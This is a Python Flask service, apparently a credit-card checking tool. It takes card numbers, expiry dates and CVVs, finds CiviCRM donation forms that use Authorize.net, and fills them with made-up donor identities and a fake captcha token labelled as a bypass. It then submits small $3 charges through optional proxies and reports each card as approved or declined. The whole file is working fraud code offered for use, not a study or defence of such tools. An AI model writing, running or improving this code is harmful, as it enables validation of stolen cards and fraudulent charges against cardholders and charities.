from flask import Flask, request, jsonify
from datetime import datetime
import random
import requests
import logging
import re
import time
import os
import string
import ssl
import urllib3
from urllib3.util.ssl_ import create_urllib3_context
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

# ====================== LOGGING ======================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
# ====================================================

requests.packages.urllib3.util.connection.HAS_IPV6 = False
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

class IgnoreSSLAdapter(requests.adapters.HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        ctx = create_urllib3_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs['ssl_context'] = ctx
        return super().init_poolmanager(*args, **kwargs)

def generate_random_user_data():
    first_names = ["John", "Sarah", "Michael", "Emily", "David", "Jessica", "James", "Lauren", "Robert", "Maria", "William", "Jennifer", "Richard", "Linda", "Joseph", "Patricia"]
    last_names = ["Smith", "Johnson", "Brown", "Taylor", "Wilson", "Davis", "Clark", "Harris", "Miller", "Moore", "Anderson", "Thomas", "Jackson", "White", "Martin"]
    email_domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "aol.com", "icloud.com"]
    city_state_zip = [
        ["New York", "New York", "10001", "1000"], ["Los Angeles", "California", "90001", "1004"],
        ["Chicago", "Illinois", "60601", "1012"], ["Houston", "Texas", "77001", "1042"],
        ["Phoenix", "Arizona", "85001", "1002"], ["Philadelphia", "Pennsylvania", "19101", "1043"],
        ["San Antonio", "Texas", "78201", "1042"], ["San Diego", "California", "92101", "1004"],
        ["Dallas", "Texas", "75201", "1042"], ["San Jose", "California", "95101", "1004"],
    ]
    street_names = ["Main St", "Oak Ave", "Elm St", "Maple Dr", "Cedar Ln", "Pine St", "Washington Ave", "Lake St", "Park Ave", "River Rd"]
   
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    middle_name = random.choice(first_names)[0]
    email_prefix = f"{first_name.lower()}{random.randint(1000,9999)}"
    email = f"{email_prefix}@{random.choice(email_domains)}"
    loc = random.choice(city_state_zip)
    city, postal_code, state_id = loc[0], loc[2], loc[3]
    street_address = f"{random.randint(100, 9999)} {random.choice(street_names)}"
    phone = f"{random.randint(200,999)}-{random.randint(200,999)}-{random.randint(1000,9999)}"
    username = f"{email_prefix}{random.randint(10,99)}"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
   
    return {'first_name': first_name, 'last_name': last_name, 'middle_name': middle_name, 'email': email, 'city': city, 'postal_code': postal_code, 'state_id': state_id, 'street_address': street_address, 'phone': phone, 'username': username, 'password': password}

def clean_card_number(ccnum): return re.sub(r'\D', '', ccnum)

def get_card_type(ccnum):
    ccnum = clean_card_number(ccnum)
    if ccnum.startswith('4'): return "Visa"
    elif ccnum.startswith('5') and len(ccnum) == 16: return "MasterCard"
    elif ccnum.startswith('3') and len(ccnum) in [15, 16]:
        if ccnum.startswith('34') or ccnum.startswith('37'): return "Amex"
    elif ccnum.startswith('6'): return "Discover"
    return "Unknown"

def create_session(proxy_url=None):
    session = requests.Session()
    session.mount('https://', IgnoreSSLAdapter())
    session.mount('http://', IgnoreSSLAdapter())
   
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0"
    }
    session.headers.update(headers)
   
    if proxy_url:
        parts = proxy_url.split(':')
        if len(parts) == 4:
            proxy_url = f"{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        if not proxy_url.startswith('http'):
            proxy_url = f'http://{proxy_url}'
        session.proxies = {"http": proxy_url, "https": proxy_url}
    return session

def detect_payment_processor(html):
    processors = {'authorize': ['authorize.net', 'authorize', 'paymentech', 'cybersource'], 'stripe': ['stripe', 'stripe.js', 'stripe.com', 'v3/stripe'], 'paypal': ['paypal', 'paypal.com']}
    detected = []
    for pattern in [r'authorize\.net', r'Authorize\.Net', r'payment gateway authorize', r'authorizenet']:
        if re.search(pattern, html, re.I): detected.append('authorize'); break
    auth_fields = ['credit_card_number', 'cvv2', 'credit_card_exp_date']
    if sum(1 for field in auth_fields if re.search(r'name=["\']?' + re.escape(field) + r'["\']?', html, re.I)) >= 2 and 'authorize' not in detected: detected.append('authorize')
    if 'authorize' not in detected:
        for pattern in [r'stripe\.com', r'stripe\.js', r'js\.stripe\.com']:
            if re.search(pattern, html, re.I): detected.append('stripe'); break
    return detected

def extract_raw_fields(html, soup, form):
    payload = {}
    inputs = form.find_all('input')
   
    submit_button_name = None
    submit_button_value = None
    for inp in inputs:
        if inp.get('type') in ['submit', 'button']:
            name = inp.get('name')
            if name and '_qf_' in name:
                submit_button_name = name
                submit_button_value = inp.get('value', '1')
                break
    if not submit_button_name:
        submit_button_name = "_qf_Main_upload"
        submit_button_value = "1"
   
    payload['_submit_button_name'] = submit_button_name
    payload['_submit_button_value'] = submit_button_value
    for inp in inputs:
        name = inp.get('name')
        input_type = inp.get('type', 'text')
        value = inp.get('value', '')
        required = inp.get('required', False)
        if name:
            if input_type == 'radio':
                if name not in payload: payload[name] = {'value': value, 'type': input_type, 'required': required, 'options': []}
                if value and value not in payload[name]['options']: payload[name]['options'].append(value)
                if inp.get('checked'): payload[name]['value'] = value
            else:
                payload[name] = {'value': value, 'type': input_type, 'required': required}
   
    for sel in form.find_all('select'):
        name = sel.get('name')
        if name:
            options = sel.find_all('option')
            option_values = [opt.get('value', '') for opt in options] if options else []
            default_value = sel.find('option', selected=True).get('value', '') if sel.find('option', selected=True) else (options[0].get('value', '') if options else '')
            payload[name] = {'value': default_value, 'type': 'select', 'required': sel.get('required', False), 'options': option_values}
   
    for txt in form.find_all('textarea'):
        name = txt.get('name')
        if name: payload[name] = {'value': txt.get_text(strip=True), 'type': 'textarea', 'required': txt.get('required', False)}
   
    payment_processor_id = None
    for inp in inputs:
        if inp.get('type') == 'radio' and 'payment_processor' in inp.get('name', '').lower():
            value = inp.get('value', '')
            label = inp.find_next('label') if inp.find_next('label') else None
            label_text = label.get_text(strip=True) if label else ''
            if 'authorize' in label_text.lower() or 'authorize' in str(value).lower():
                payment_processor_id = value; break
            elif not payment_processor_id: payment_processor_id = value
    if not payment_processor_id:
        for inp in inputs:
            if inp.get('type') == 'hidden' and 'payment_processor' in inp.get('name', '').lower() and inp.get('value'):
                payment_processor_id = inp.get('value'); break
    if payment_processor_id: payload['_detected_payment_processor_id'] = {'value': payment_processor_id, 'type': 'detected'}
    return payload

def get_form_action_and_payload(session, url, proxy_url):
    try:
        resp = session.get(url, timeout=15, allow_redirects=True)
        html = resp.text
        
        logger.info(f"GET Status: {resp.status_code} | URL: {url}")
        
        qfkey = None
        for pattern in [r'name="qfKey"\s+value="([^"]+)"', r'name="qfKey"\s*type="hidden"\s*value="([^"]+)"', r'qfKey=([a-zA-Z0-9]+)']:
            match = re.search(pattern, html)
            if match: 
                qfkey = match.group(1)
                logger.info(f"QFKEY DITEMUI: {qfkey}")
                break
           
        if not qfkey:
            logger.error("No qfKey found in page!")
            return None, None, None, None, "Failed: No qfKey (Blocked by Captcha/Cloudflare)"
        
        processors = detect_payment_processor(html)
        has_authorize = 'authorize' in processors
        if 'stripe' in processors: return None, None, None, None, "Stripe Detected"
        if not has_authorize and processors: return None, None, None, None, "Other Processor"
       
        soup = BeautifulSoup(html, 'html.parser')
        form = soup.find('form', id=re.compile(r'Main|main|Contribution', re.I)) or soup.find('form', class_=re.compile(r'crm|contribute', re.I)) or soup.find('form')
        if not form: 
            logger.error("Form not found")
            return None, None, None, None, "Form not found"
       
        form_action = form.get('action') or re.search(r'<form[^>]*action="([^"]+)"', html).group(1) if re.search(r'<form[^>]*action="([^"]+)"', html) else None
        if form_action and not form_action.startswith('http'): form_action = urljoin(url, form_action)
        if not form_action: 
            logger.error("Form action not found")
            return None, None, None, None, "Form action not found"
       
        payload = extract_raw_fields(html, soup, form)
        logger.info(f"Raw payload keys found: {list(payload.keys())}")
        return qfkey, form_action, payload, has_authorize, "OK"
       
    except Exception as e:
        logger.error(f"Exception in get_form_action_and_payload: {str(e)}")
        return None, None, None, None, "Failed to fetch"

def parse_response(html, url):
    soup = BeautifulSoup(html, 'html.parser')
   
    logger.info(f"Response URL: {url}")
    
    status_div = soup.find('div', class_='status')
    if not status_div:
        status_div = soup.find('div', class_=re.compile(r'alert|error|messages', re.I))
    
    if status_div:
        full_error = status_div.get_text(strip=True)
        logger.warning(f"ERROR DIV FOUND: {full_error}")
        logger.warning(f"ERROR HTML SNIPPET:\n{str(status_div)[:2000]}")
        
        error_items = status_div.find_all('li')
        if error_items:
            errors = [item.get_text(strip=True) for item in error_items]
            error_message = " | ".join(errors)
            return {'approved': False, 'has_msg': True, 'message': f'Form Error: {error_message}', 'clean_response': error_message}
        else:
            error_text = re.sub(r'\s+', ' ', full_error).strip()
            return {'approved': False, 'has_msg': True, 'message': f'Status: {error_text}', 'clean_response': error_text}
   
    if '_qf_ThankYou_display=true' in url or '_qf_ThankYou_display=1' in url:
        return {'approved': True, 'has_msg': False, 'message': 'Payment complete', 'clean_response': 'Payment complete'}
   
    if '_qf_Confirm_display=true' in url or '_qf_Confirm_display=1' in url:
        return {'approved': False, 'has_msg': False, 'message': 'Confirmation page', 'clean_response': '', 'is_confirmation': True}
   
    logger.warning("No error div found - stuck on form")
    # Dump more HTML for debug
    logger.warning(f"FULL RESPONSE SNIPPET (first 3000 chars):\n{html[:3000]}")
    return {'approved': False, 'has_msg': False, 'message': 'Form Incomplete / Stuck on Initial Page', 'clean_response': 'Stuck on Initial'}

def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=False):
    scheme = get_card_type(ccnum)
    full_year = f"20{yy}" if len(yy) == 2 else yy
    input_month = int(mm)
    final_payload = {}
   
    final_payload["qfKey"] = qfkey
    final_payload["entryURL"] = base_url.replace("&amp;", "&")
    final_payload["g-recaptcha-response"] = "03AGdBq25 FakeTokenCivicrmBypass1234567890"
   
    if is_confirm:
        final_payload["_qf_default"] = "Confirm:next"
        final_payload["_qf_Confirm_next"] = "1"
    else:
        final_payload["_qf_default"] = "Main:upload"
        submit_name = raw_payload.get('_submit_button_name', '_qf_Main_upload')
        final_payload[submit_name] = raw_payload.get('_submit_button_value', '1')
    
    if '_detected_payment_processor_id' in raw_payload:
        final_payload['payment_processor_id'] = raw_payload['_detected_payment_processor_id'].get('value', '4')
    
    final_payload['is_recur'] = "0"
    
    price_selected = False
    for key, field_info in raw_payload.items():
        if key in ['_detected_payment_processor_id', '_submit_button_name', '_submit_button_value']: continue
        if not isinstance(field_info, dict): continue
        field_type = field_info.get('type', 'text')
        current_value = field_info.get('value', '')
        key_lower = key.lower()

        if key == 'price_2':
            final_payload[key] = "3.00"
            price_selected = True
            continue
        if key == 'priceSetId':
            final_payload[key] = "3"
            continue
        if key == 'selectProduct':
            final_payload[key] = current_value if current_value else "1"
            continue

        if 'frequency' in key_lower or 'installments' in key_lower or 'recur' in key_lower:
            if key == 'frequency_interval':
                final_payload[key] = "1"
            elif key == 'frequency_unit':
                final_payload[key] = "month"
            elif key == 'installments':
                final_payload[key] = "0"
            else:
                final_payload[key] = "0"
            continue

        if 'card' in key_lower and ('number' in key_lower or 'no' in key_lower or 'num' in key_lower): 
            final_payload[key] = ccnum
        elif 'cvv' in key_lower or 'cvc' in key_lower or 'cid' in key_lower or ('security' in key_lower and 'code' in key_lower): 
            final_payload[key] = cvv
        elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): 
            final_payload[key] = full_year
        elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): 
            final_payload[key] = str(input_month)
        elif 'card' in key_lower and 'type' in key_lower: 
            final_payload[key] = scheme

        elif 'first' in key_lower and 'name' in key_lower: 
            final_payload[key] = user_data['first_name']
        elif 'last' in key_lower and 'name' in key_lower: 
            final_payload[key] = user_data['last_name']
        elif 'middle' in key_lower and 'name' in key_lower: 
            final_payload[key] = user_data['middle_name']
        elif 'email' in key_lower: 
            final_payload[key] = user_data['email']
        elif 'street' in key_lower or 'address' in key_lower or 'addr1' in key_lower or 'line_1' in key_lower: 
            final_payload[key] = user_data['street_address']
        elif 'city' in key_lower: 
            final_payload[key] = user_data['city']
        elif 'zip' in key_lower or 'postal' in key_lower: 
            final_payload[key] = user_data['postal_code']
        elif 'phone' in key_lower or 'tel' in key_lower or 'mobile' in key_lower: 
            final_payload[key] = user_data['phone']
        elif 'pass' in key_lower or 'pwd' in key_lower: 
            final_payload[key] = user_data['password']
        elif 'user' in key_lower or 'login' in key_lower: 
            final_payload[key] = user_data['username']

        elif 'price' in key_lower or 'amount' in key_lower:
            if not price_selected:
                final_payload[key] = "3.00"
                price_selected = True
            else:
                final_payload[key] = "0"
        else:
            if current_value not in [None, '']:
                final_payload[key] = current_value

    return final_payload

def extract_confirmation_form(html, soup):
    confirm_form = soup.find('form', id=re.compile(r'Confirm|confirm', re.I))
    if not confirm_form:
        confirm_form = soup.find('form', class_=re.compile(r'confirm', re.I))
    if not confirm_form:
        for form in soup.find_all('form'):
            if form.find('input', {'name': '_qf_Confirm_next'}) or form.find('button', {'name': '_qf_Confirm_next'}):
                confirm_form = form
                break
    if not confirm_form:
        return None
    payload = {}
    inputs = confirm_form.find_all('input')
    for inp in inputs:
        name = inp.get('name')
        input_type = inp.get('type', 'text')
        value = inp.get('value', '')
        if name:
            payload[name] = {'value': value, 'type': input_type}
    return payload

def process_site_for_payload(url, override_proxy=None):
    proxy_url = override_proxy if override_proxy else None
    session = create_session(proxy_url)
    qfkey, form_action, payload, has_authorize, err_msg = get_form_action_and_payload(session, url, proxy_url)
   
    if err_msg != "OK":
        session.close()
        return {'url': url, 'status': err_msg.lower().replace(' ', '_'), 'payload': None, 'session': None, 'proxy_url': None}
   
    if not qfkey or not form_action:
        session.close()
        return {'url': url, 'status': 'failed', 'payload': None, 'session': None, 'proxy_url': None}
   
    return {'url': url, 'status': 'success', 'payload': payload, 'form_action': form_action, 'qfkey': qfkey, 'has_authorize': has_authorize, 'session': session, 'proxy_url': proxy_url}

def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
    base_url, raw_payload, form_action, qfkey = site_data['url'], site_data['payload'], site_data['form_action'], site_data['qfkey']
    session = site_data.get('session')
   
    ccnum = clean_card_number(ccnum)
    user_data = generate_random_user_data()
    detected_price = 3.0
    
    for attempt in range(3):
        try:
            if 'qfKey=' in form_action and f'qfKey={qfkey}' not in form_action:
                form_action = re.sub(r'qfKey=[a-zA-Z0-9]+', f'qfKey={qfkey}', form_action)
            elif 'qfKey=' not in form_action:
                if '?' in form_action: form_action += f'&qfKey={qfkey}'
                else: form_action += f'?qfKey={qfkey}'
            
            clean_initial = build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=False)
            
            logger.info("=== FINAL PAYLOAD (INITIAL) ===")
            for k, v in sorted(clean_initial.items()):
                if any(x in k.lower() for x in ['card', 'cvv', 'password', 'token']):
                    logger.info(f"{k}: [REDACTED]")
                else:
                    logger.info(f"{k}: {v}")
            
            origin_url = urlparse(base_url).scheme + "://" + urlparse(base_url).netloc
            session.headers.update({
                "Referer": base_url,
                "Origin": origin_url,
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Upgrade-Insecure-Requests": "1"
            })
            
            response = session.post(form_action, data=clean_initial, timeout=25, allow_redirects=True)
            logger.info(f"POST Response Status: {response.status_code} | URL: {response.url}")
            
            # Dump response if stuck
            if not '_qf_Confirm' in response.url and not '_qf_ThankYou' in response.url:
                logger.warning(f"STUCK RESPONSE SNIPPET:\n{response.text[:2500]}")
            
            soup_resp = BeautifulSoup(response.text, 'html.parser')
            confirm_btn = soup_resp.find('input', {'name': '_qf_Confirm_next'}) or soup_resp.find('button', {'name': '_qf_Confirm_next'})
            is_confirmation = '_qf_Confirm_display=true' in response.url or '_qf_Confirm_display=1' in response.url
           
            if confirm_btn or is_confirmation:
                input_qfkey = soup_resp.find('input', {'name': 'qfKey'})
                if input_qfkey: qfkey = input_qfkey.get('value', qfkey)
                confirm_hidden = extract_confirmation_form(response.text, soup_resp)
               
                merged_payload = raw_payload.copy()
                if confirm_hidden:
                    for k, v in confirm_hidden.items():
                        merged_payload[k] = v
                clean_confirm = build_clean_payload(merged_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=True)
                confirm_response = session.post(form_action, data=clean_confirm, timeout=25, allow_redirects=True)
               
                result = parse_response(confirm_response.text, confirm_response.url)
            else:
                result = parse_response(response.text, response.url)
            
            if session: session.close()
            return result, detected_price
           
        except Exception as e:
            logger.error(f"Error attempt {attempt}: {str(e)}")
            if session: session.close()
            return {'approved': False, 'message': str(e)}, detected_price

@app.route('/auth', methods=['GET'])
def handle_auth():
    start_time = time.time()
   
    site = request.args.get('site')
    id_param = request.args.get('id')
    if site and id_param and 'id=' not in site:
        site = f"{site}&id={id_param}"
    cc_param = request.args.get('cc')
    proxy_param = request.args.get('proxy')
    if not site or not cc_param:
        return jsonify({"error": "Missing 'site' or 'cc' parameter"}), 400
    try:
        parts = cc_param.split('|')
        if len(parts) != 4:
            return jsonify({"error": "Invalid 'cc' format. Expected: number|mm|yy|cvv"}), 400
        cc, mm, yy, cvv = parts
    except Exception as e:
        return jsonify({"error": "Error parsing 'cc' parameter: " + str(e)}), 400
    override_proxy = proxy_param if proxy_param else None
    try:
        site_data = process_site_for_payload(site, override_proxy)
       
        if site_data['status'] == 'success':
            result, detected_price = process_card_on_site(site_data, cc, mm, yy, cvv, override_proxy)
           
            if not result:
                result = {'approved': False, 'message': 'Failed to process site data.', 'clean_response': 'Failed'}
        else:
            result = {'approved': False, 'message': site_data['status'], 'clean_response': site_data['status']}
            detected_price = 0.0
           
    except Exception as e:
        result = {'approved': False, 'message': 'Server exception: ' + str(e), 'clean_response': 'Server exception'}
        detected_price = 0.0
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)
    result_status = "Approved" if result.get('approved', False) else "Declined"
   
    response_msg = result.get('message', 'Unknown Error')
    return jsonify({
        "Gateway": "Authorized.net",
        "Price": detected_price,
        "Result": result_status,
        "Response": response_msg,
        "Status": result.get('approved', False),
        "Time": f"{time_taken}s",
        "cc": cc_param
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
